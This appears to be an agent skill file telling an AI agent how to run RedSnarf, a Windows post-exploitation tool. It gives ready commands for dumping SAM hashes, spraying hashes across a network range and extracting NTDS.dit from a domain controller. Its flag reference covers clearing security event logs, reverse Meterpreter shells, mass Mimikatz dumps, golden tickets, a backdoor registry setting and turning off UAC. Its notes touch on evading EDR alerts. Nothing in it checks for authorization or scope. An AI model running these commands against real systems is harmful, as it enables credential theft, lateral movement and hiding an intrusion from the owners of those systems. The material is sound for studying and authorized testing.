---
name: redsnarf
description: Retrieve credentials, hashes, and LSA secrets from Windows workstations, servers, and domain controllers using OpSec safe techniques. Use when performing post-exploitation, lateral movement, credential harvesting, or Windows environment auditing during penetration testing.
---

# redsnarf

## Overview
RedSnarf is a pentesting and red teaming tool designed for retrieving local SAM hashes, MS cached credentials, and LSA secrets from Windows systems. It supports pass-the-hash, hash spraying, and various enumeration techniques to identify weak credentials or elevated privileges. Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)
Assume redsnarf is already installed. If you encounter errors, install via:

```bash
sudo apt install redsnarf
```

## Common Workflows

### Retrieve SAM hashes from a single host
```bash
redsnarf -H ip=192.168.1.10 -u administrator -p Password123
```

### Hash spraying across a network range
```bash
redsnarf -H range=192.168.1.0/24 -u administrator -p Password123
```

### Extract NTDS.dit hashes from a Domain Controller using DRSUAPI
```bash
redsnarf -H ip=10.0.0.1 -u DomainAdmin -p Password1 -d internal.corp -hI y
```

### Take a screenshot of a remote desktop
```bash
redsnarf -H ip=192.168.1.15 -u user -p Password1 -eS y
```

## Complete Command Reference

### Core Options
| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show help message and exit |
| `-H`, `--host <HOST>` | Specify target: `ip=192.168.0.1`, `range=192.168.0.0/24`, or `file=targets.txt` |
| `-u`, `--username <USER>` | Username for authentication |
| `-p`, `--password <PASS>` | Password or NT hash for authentication |
| `-d`, `--domain_name <DOM>` | Optional: Active Directory domain name |

### Configurational Options
| Flag | Description |
|------|-------------|
| `-cC`, `--credpath <PATH>` | Path to creddump7 (default: `/usr/share/creddump7/`) |
| `-cM`, `--mergepf <FILE>` | Output path/filename to merge multiple pwdump files (default: `/tmp/merged.txt`) |
| `-cO`, `--outputpath <DIR>` | Output directory (default: `/tmp/`) |
| `-cQ`, `--quick_validate <Y/N>` | Quickly validate credentials |
| `-cS`, `--skiplsacache <Y/N>` | Skip dumping LSA and cache; go straight to SAM hashes |

### Utilities
| Flag | Description |
|------|-------------|
| `-uA`, `--auto_complete` | Copy autocomplete file to `/etc/bash_completion.d` |
| `-uC`, `--clear_event <LOG>` | Clear event log: `application`, `security`, `setup`, or `system` |
| `-uCP`, `--custom_powershell` | Run custom PowerShell scripts found in RedSnarf folder |
| `-uCIDR`, `--cidr <CIDR>` | Convert CIDR to IP, hostmask, and broadcast |
| `-uD`, `--dropshell <Y/N>` | Open a shell on the remote machine |
| `-uE`, `--empire_launcher` | Start Empire Launcher |
| `-uFT`, `--file_transcribe` | Convert file to base64 and send via SendKeys |
| `-uG`, `--c_password` | Decrypt GPP Cpassword |
| `-uMC`, `--mcafee_sites` | Decrypt McAfee Sites password |
| `-uJ`, `--john_to_pipal` | Send JtR cracked passwords to Pipal for auditing |
| `-uJW`, `--sendtojohn <FILE>` | Send NT Hash file to John the Ripper |
| `-uJS`, `--sendspntojohn <FILE>` | Send SPN Hash file to JtR Jumbo |
| `-uL`, `--lockdesktop` | Lock remote user's desktop |
| `-uLP`, `--liveips` | Ping scan to generate a list of live IPs |
| `-uM`, `--mssqlshell <TYPE>` | Start MSSQL Shell (`WIN` for Windows Auth, `DB` for MSSQL Auth) |
| `-uMT`, `--meterpreter_revhttps`| Launch Reverse Meterpreter HTTPS |
| `-uO`, `--delegated_privs` | Delegated Privilege Checker |
| `-uP`, `--policiesscripts_dump` | Dump Policies and Scripts folder from a Domain Controller |
| `-uR`, `--multi_rdp` | Enable Multi-RDP with Mimikatz |
| `-uRP`, `--rdp_connect` | Connect to existing RDP sessions without a password |
| `-uRS`, `--snarf_shell` | Start Reverse Listening Snarf Shell |
| `-uS`, `--get_spn` | Get SPNs from Domain Controller |
| `-uSS`, `--split_spn` | Split SPN file |
| `-uSCF`, `--scf_creator` | Create an SCF file for SMB hash capturing |
| `-uSG`, `--session_gopher` | Run Session Gopher on remote machine |
| `-uU`, `--unattend` | Search for and grep unattended installation files |
| `-uX`, `--xcommand <CMD>` | Run custom command |
| `-uXS`, `--xscript <SCRIPT>` | Run custom script |
| `-uW`, `--wifi_credentials` | Grab Wifi credentials |
| `-uWU`, `--windows_updates` | Get Windows Update status |

### Hash Related Options
| Flag | Description |
|------|-------------|
| `-hI`, `--drsuapi` | Extract NTDS.dit hashes via DRSUAPI (accepts machine name as user) |
| `-hN`, `--ntds_util` | Extract NTDS.dit using NTDSUtil |
| `-hQ`, `--qldap` | Query LDAP for account status when dumping domain hashes |
| `-hS`, `--credsfile <FILE>` | Spray multiple hashes at a target range |
| `-hP`, `--pass_on_blank <PASS>` | Password to use when only username is found in Creds File |
| `-hK`, `--mimikittenz` | Run Mimikittenz |
| `-hL`, `--lsass_dump` | Dump lsass for offline use with Mimikatz |
| `-hM`, `--massmimi_dump` | Mimikatz dump credentials from remote machine(s) |
| `-hR`, `--stealth_mimi` | Stealth version of mass-mimikatz |
| `-hT`, `--golden_ticket` | Create a Golden Ticket |
| `-hW`, `--win_scp` | Check for and decrypt WinSCP hashes |

### Enumeration Options
| Flag | Description |
|------|-------------|
| `-eA`, `--service_accounts` | Enumerate service accounts |
| `-eD`, `--user_desc` | Save AD User Description field to file (checks for passwords) |
| `-eL`, `--find_user` | Find user (Live) |
| `-eO`, `--ofind_user` | Find user (Offline) |
| `-eP`, `--password_policy` | Display Password Policy |
| `--protocols [PROTOCOLS]` | Specify protocols (default: `139/SMB`, `445/SMB`) |
| `-eR`, `--recorddesktop` | Record desktop using Windows Problem Steps Recorder |
| `-eS`, `--screenshot` | Take a screenshot of remote machine desktop |
| `-eT`, `--system_tasklist` | Display NT AUTHORITY\SYSTEM Tasklist |

### Registry Related Options
*Note: Options usually accept `e` (enable), `d` (disable), or `q` (query).*

| Flag | Description |
|------|-------------|
| `-rA`, `--edq_autologon` | AutoLogon Registry Setting |
| `-rB`, `--edq_backdoor` | Backdoor Registry Setting |
| `-rC`, `--edq_scforceoption` | Smart Card scforceoption Registry Setting |
| `-rF`, `--fat` | Write batch file for FilterAdministratorToken Policy |
| `-rL`, `--lat` | Write batch file for Local Account Token Filter Policy |
| `-rM`, `--edq_SingleSessionPerUser` | RDP SingleSessionPerUser Registry Setting |
| `-rN`, `--edq_nla` | NLA Status |
| `-rR`, `--edq_rdp` | RDP Status |
| `-rS`, `--edq_allowtgtsessionkey` | allowtgtsessionkey Registry Setting |
| `-rT`, `--edq_trdp` | Tunnel RDP out of port 443 |
| `-rU`, `--edq_uac` | UAC Registry Setting |
| `-rW`, `--edq_wdigest` | Wdigest UseLogonCredential Registry Setting |

## Notes
- RedSnarf is designed to be "OpSec Safe," but interacting with LSASS or clearing event logs may still trigger EDR alerts.
- When using `-hI` (DRSUAPI), you can often use the machine account (e.g., `HOSTNAME$`) if you have sufficient privileges.
- Output is saved to `/tmp/` by default unless `-cO` is specified.